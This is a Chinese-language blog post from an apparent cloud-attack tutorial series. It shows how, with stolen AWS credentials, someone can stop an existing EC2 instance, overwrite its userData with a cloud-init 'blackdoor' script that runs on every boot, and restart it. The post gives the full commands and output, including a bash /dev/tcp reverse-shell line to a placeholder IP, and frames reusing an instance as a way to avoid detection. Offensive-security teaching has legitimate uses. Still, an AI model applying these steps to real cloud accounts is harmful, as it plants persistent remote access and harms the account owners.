---
author: Sunny Tsai
title: "[Day 27] 天堂雲端 - reverse shell via credential 2"
date: 2023-10-10
math: true
tags: [
    "aws",
    "reverse shell"
]
categories: [
    "2023鐵人賽"
]
series: ["2023鐵人賽-天堂雲端之從開始到接管"]
---
建立新的EC2 instance做reverse shell並不一直是一個好的主意，首先，新啟動一個EC2很容易被發現。

# 利用現有instance
必須要有的權限：
> ec2:DescribeInstances
> ec2:ModifyInstanceAttribute

首先，先暫停ec2，沒有暫停不能修改
```shell
> aws ec2 stop-instances --instance-ids {EC2_INSTANCE_IP}
```

沒暫停的Output
```shell
An error occurred (IncorrectInstanceState) when calling the ModifyInstanceAttribute operation: The instance 'i-XXXXXXXXXXXX' is not in the 'stopped' state.
```

成功暫停的Output
```json
{
    "StoppingInstances": [
        {
            "CurrentState": {
                "Code": 64,
                "Name": "stopping"
            },
            "InstanceId": "i-XXXXXXXXXXXX",
            "PreviousState": {
                "Code": 16,
                "Name": "running"
            }
        }
    ]
}
```

## Build blackdoor.sh
```bash
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
echo "Hello World" >> /home/ubuntu/hello.txt   # 這行是測試用的
/bin/bash -i >& /dev/tcp/IP/PORT 0>&1    # Reverse shell範例

--//

```

### base64 encode
```shell
> base64 -i blackdoor.sh > blackdoor_encoded.sh  # 這是Mac寫法，其他作業系統不要抄錯了
```

## Modify instance attribute
```shell
> aws ec2 modify-instance-attribute \
    --instance-id i-XXXXXXXXXXXX \
    --attribute userData \
    --value file://blackdoor_encoded.sh
```

## Start EC2 instance
```shell
> aws ec2 start-instances --instance-ids i-09d20a0b2b49d77cc
```

Output
```json
{
    "StartingInstances": [
        {
            "CurrentState": {
                "Code": 0,
                "Name": "pending"
            },
            "InstanceId": "i-XXXXXXXXXX",
            "PreviousState": {
                "Code": 80,
                "Name": "stopped"
            }
        }
    ]
}
```

等狀態是`執行中`或是`running`的時候就可以進去EC2查看

# 檢查
`/var/log/cloud-init-output.log`有沒有出現錯誤
